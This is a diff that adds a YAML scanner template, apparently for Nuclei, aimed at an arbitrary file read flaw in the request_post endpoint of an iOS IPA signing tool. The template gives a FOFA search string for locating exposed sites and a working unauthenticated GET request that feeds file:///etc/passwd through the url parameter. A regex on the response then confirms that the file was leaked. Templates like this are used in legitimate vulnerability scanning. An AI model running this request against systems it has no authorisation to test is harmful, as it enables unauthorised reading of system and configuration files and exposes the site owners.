@@ -1,0 +1,27 @@
+id: IOS-request_post-File-reading
+
+info:
+  tags: IOS-request_post-File-reading
+  name: 苹果IOS端IPA签名工具 request_post 任意文件读取
+  author: xc
+  severity: high
+  description: |-
+    fofa: body="/assets/index/css/mobileSelect.css"
+    苹果IOS端IPA签名工具 request_post 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+
+
+http:
+  - raw:
+      - |
+        GET /api/index/request_post?url=file:///etc/passwd&post_data=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'root:.*:0:0'
+      - type: status
+        status: 
+          - 200
